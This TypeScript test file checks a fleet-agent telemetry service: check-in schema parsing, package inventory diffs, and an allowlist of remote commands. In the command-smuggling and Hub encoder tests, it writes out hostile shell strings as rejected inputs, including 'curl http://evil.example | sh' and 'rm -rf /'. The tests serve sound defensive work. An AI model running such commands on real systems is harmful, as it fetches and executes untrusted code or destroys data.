import assert from "node:assert/strict"
import test from "node:test"

import { checkInSchema } from "./domain"
import {
  agentCommandSchema,
  checkInIssuePaths,
  checkInResponseSchema,
  diffPackages,
  encodeHubCommands,
  hubCheckInResponse,
  inventoryFromCheckIn,
  requestedDeviceIdFromUnknown,
  resolveAgentCommand,
  resolveAgentCommands,
  type PackageRecord,
} from "./telemetry"

const validCheckIn = {
  device_id: "11111111-1111-4111-8111-111111111111",
  check_in_secret: "secret",
  agent_version: "0.1.0",
  hostname: "kiosk-01",
  os_family: "linux",
  os_version: "Debian GNU/Linux 12",
  vpn: { interface_up: true, vpn_ipv4: "10.80.30.11" },
  services: [{ type: "ssh" as const, port: 22, listening: true }],
}

test("check-in payload still parses without metrics or packages", () => {
  const parsed = checkInSchema.safeParse(validCheckIn)
  assert.equal(parsed.success, true)
  if (parsed.success) {
    assert.equal(parsed.data.metrics, undefined)
    assert.equal(parsed.data.packages, undefined)
    assert.equal(parsed.data.command_results, undefined)
  }
})

test("check-in payload parses optional metrics and packages", () => {
  const parsed = checkInSchema.safeParse({
    ...validCheckIn,
    metrics: {
      uptime_seconds: 3600,
      cpu: { load1: 0.1, load5: 0.2, load15: 0.3, cores: 4 },
      memory: {
        total_bytes: 8_000_000_000,
        available_bytes: 4_000_000_000,
        used_bytes: 4_000_000_000,
      },
      disks: [
        {
          mount: "/",
          filesystem: "ext4",
          total_bytes: 100,
          used_bytes: 40,
          available_bytes: 60,
        },
      ],
      network: [{ name: "eth0", rx_bytes: 10, tx_bytes: 20 }],
      wireguard: { handshake_age_seconds: 12 },
    },
    packages: {
      reboot_required: true,
      installed: [{ name: "curl", version: "8.0.0", source: "apt" }],
      available_updates: [
        {
          name: "curl",
          current_version: "8.0.0",
          available_version: "8.1.0",
          source: "apt",
        },
      ],
    },
  })

  assert.equal(parsed.success, true)
  if (parsed.success) {
    assert.equal(parsed.data.metrics?.uptime_seconds, 3600)
    assert.equal(parsed.data.packages?.reboot_required, true)
    assert.equal(parsed.data.packages?.installed[0]?.name, "curl")
  }
})

test("check-in payload accepts command results from the previous cycle", () => {
  const parsed = checkInSchema.safeParse({
    ...validCheckIn,
    command_results: [
      {
        id: "22222222-2222-4222-8222-222222222222",
        status: "refused",
        detail: "This command is not allowed.",
      },
    ],
  })
  assert.equal(parsed.success, true)
})

test("check-in payload rejects invalid metrics", () => {
  const parsed = checkInSchema.safeParse({
    ...validCheckIn,
    metrics: {
      uptime_seconds: -1,
      cpu: { load1: 0, load5: 0, load15: 0 },
      memory: { total_bytes: 1, available_bytes: 1, used_bytes: 1 },
    },
  })
  assert.equal(parsed.success, false)
})

test("check-in payload treats JSON null telemetry arrays as empty", () => {
  const parsed = checkInSchema.safeParse({
    ...validCheckIn,
    metrics: {
      uptime_seconds: 10,
      cpu: { load1: 0, load5: 0, load15: 0 },
      memory: { total_bytes: 1, available_bytes: 1, used_bytes: 1 },
      disks: null,
      network: null,
    },
    packages: {
      reboot_required: false,
      installed: [],
      available_updates: null,
    },
  })
  assert.equal(parsed.success, true)
  if (parsed.success) {
    assert.deepEqual(parsed.data.metrics?.disks, [])
    assert.deepEqual(parsed.data.metrics?.network, [])
    assert.deepEqual(parsed.data.packages?.available_updates, [])
  }
})

test("invalid payload still exposes device_id and field paths, not values", () => {
  assert.equal(
    requestedDeviceIdFromUnknown({
      ...validCheckIn,
      check_in_secret: "must-not-appear-in-issue-paths",
    }),
    "11111111-1111-4111-8111-111111111111"
  )
  assert.equal(requestedDeviceIdFromUnknown(null), null)
  assert.equal(requestedDeviceIdFromUnknown({ device_id: "not-a-uuid" }), null)

  const parsed = checkInSchema.safeParse({
    ...validCheckIn,
    vpn: { interface_up: true, vpn_ipv4: "" },
  })
  assert.equal(parsed.success, false)
  if (!parsed.success) {
    const paths = checkInIssuePaths(parsed.error)
    assert.ok(paths.includes("vpn.vpn_ipv4"))
    assert.equal(
      JSON.stringify(paths).includes("must-not-appear-in-issue-paths"),
      false
    )
  }
})

test("package inventory merges installed rows with available updates", () => {
  const inventory = inventoryFromCheckIn({
    reboot_required: false,
    installed: [
      { name: "curl", version: "8.0.0", source: "apt" },
      { name: "bash", version: "5.2", source: "apt" },
    ],
    available_updates: [
      {
        name: "curl",
        current_version: "8.0.0",
        available_version: "8.1.0",
        source: "apt",
      },
      {
        name: "openssl",
        available_version: "3.2.1",
        source: "apt",
      },
    ],
  })

  assert.deepEqual(
    inventory.map((pkg) => ({
      name: pkg.name,
      version: pkg.version,
      availableVersion: pkg.availableVersion,
    })),
    [
      { name: "bash", version: "5.2", availableVersion: null },
      { name: "curl", version: "8.0.0", availableVersion: "8.1.0" },
      { name: "openssl", version: "", availableVersion: "3.2.1" },
    ]
  )
})

test("package diff reports added, removed, updated, and unchanged", () => {
  const previous: PackageRecord[] = [
    {
      name: "curl",
      version: "8.0.0",
      source: "apt",
      availableVersion: null,
    },
    {
      name: "bash",
      version: "5.2",
      source: "apt",
      availableVersion: null,
    },
    {
      name: "gone",
      version: "1.0",
      source: "apt",
      availableVersion: null,
    },
  ]
  const next: PackageRecord[] = [
    {
      name: "curl",
      version: "8.1.0",
      source: "apt",
      availableVersion: null,
    },
    {
      name: "bash",
      version: "5.2",
      source: "apt",
      availableVersion: null,
    },
    {
      name: "jq",
      version: "1.7",
      source: "apt",
      availableVersion: "1.7.1",
    },
  ]

  const diff = diffPackages(previous, next)
  assert.deepEqual(
    diff.added.map((pkg) => pkg.name),
    ["jq"]
  )
  assert.deepEqual(
    diff.removed.map((pkg) => pkg.name),
    ["gone"]
  )
  assert.equal(diff.updated.length, 1)
  assert.equal(diff.updated[0]?.previous.version, "8.0.0")
  assert.equal(diff.updated[0]?.next.version, "8.1.0")
  assert.deepEqual(
    diff.unchanged.map((pkg) => pkg.name),
    ["bash"]
  )
})

test("agent command schema accepts only the closed whitelist", () => {
  const id = "22222222-2222-4222-8222-222222222222"
  assert.equal(
    agentCommandSchema.safeParse({ id, kind: "reboot" }).success,
    true
  )
  assert.equal(
    agentCommandSchema.safeParse({ id, kind: "restart" }).success,
    true
  )
  assert.equal(
    agentCommandSchema.safeParse({ id, kind: "update" }).success,
    true
  )
  assert.equal(
    agentCommandSchema.safeParse({ id, kind: "shutdown" }).success,
    false
  )
})

test("agent command schema refuses extra fields that could carry a shell string", () => {
  const id = "22222222-2222-4222-8222-222222222222"
  const smuggled = agentCommandSchema.safeParse({
    id,
    kind: "reboot",
    command: "curl http://evil.example | sh",
  })
  assert.equal(smuggled.success, false)

  const script = agentCommandSchema.safeParse({
    id,
    kind: "update",
    script: "rm -rf /",
  })
  assert.equal(script.success, false)

  const args = agentCommandSchema.safeParse({
    id,
    kind: "restart",
    args: ["-c", "id"],
  })
  assert.equal(args.success, false)
})

test("resolveAgentCommand refuses unknown kinds and never treats them as executable", () => {
  const id = "33333333-3333-4333-8333-333333333333"
  const unknown = resolveAgentCommand({ id, kind: "ssh" })
  assert.equal(unknown.ok, false)
  if (!unknown.ok) {
    assert.equal(unknown.reason, "unknown_kind")
    assert.equal(unknown.result.status, "refused")
    assert.equal(unknown.result.id, id)
  }

  const shell = resolveAgentCommand({
    id,
    kind: "reboot",
    command: "/bin/sh -c 'id'",
  })
  assert.equal(shell.ok, false)
  if (!shell.ok) {
    assert.equal(shell.reason, "unsupported_fields")
    assert.equal(shell.result.status, "refused")
  }
})

test("resolveAgentCommands keeps valid items and refuses the rest", () => {
  const rebootId = "44444444-4444-4444-8444-444444444444"
  const { accepted, refused } = resolveAgentCommands([
    { id: rebootId, kind: "reboot" },
    { id: "55555555-5555-4555-8555-555555555555", kind: "format_disk" },
    "wg-quick down lockhaven",
    { kind: "restart" },
  ])

  assert.deepEqual(
    accepted.map((command) => command.kind),
    ["reboot"]
  )
  assert.equal(accepted[0]?.id, rebootId)
  assert.equal(refused.length, 3)
  assert.ok(refused.every((result) => result.status === "refused"))
})

test("check-in response parser keeps command items as opaque values", () => {
  const parsed = checkInResponseSchema.safeParse({
    ok: true,
    desired_agent_version: "0.2.0",
    commands: [
      { id: "44444444-4444-4444-8444-444444444444", kind: "reboot" },
      { kind: "not-a-real-command", command: "id" },
    ],
  })
  assert.equal(parsed.success, true)
  if (parsed.success) {
    assert.equal(parsed.data.commands?.length, 2)
  }
})

test("Hub encoder emits only allowlisted { id, kind } objects", () => {
  const rebootId = "44444444-4444-4444-8444-444444444444"
  const encoded = encodeHubCommands([
    {
      id: rebootId,
      kind: "reboot",
      command: "curl http://evil.example | bash",
    },
    { id: "55555555-5555-4555-8555-555555555555", kind: "ssh" },
    { id: "66666666-6666-4666-8666-666666666666", kind: "update" },
  ])

  assert.deepEqual(encoded, [
    { id: "66666666-6666-4666-8666-666666666666", kind: "update" },
  ])
  assert.ok(encoded.every((command) => Object.keys(command).length === 2))
})

test("Hub check-in response never includes a free-form command string", () => {
  const response = hubCheckInResponse({
    commands: [
      {
        id: "77777777-7777-4777-8777-777777777777",
        kind: "restart",
      },
      {
        id: "88888888-8888-4888-8888-888888888888",
        kind: "reboot",
        script: "rm -rf /",
      },
    ],
  })

  assert.equal(response.ok, true)
  assert.deepEqual(response.commands, [
    { id: "77777777-7777-4777-8777-777777777777", kind: "restart" },
  ])
  const serialized = JSON.stringify(response)
  assert.equal(serialized.includes("script"), false)
  assert.equal(serialized.includes("rm -rf"), false)
})
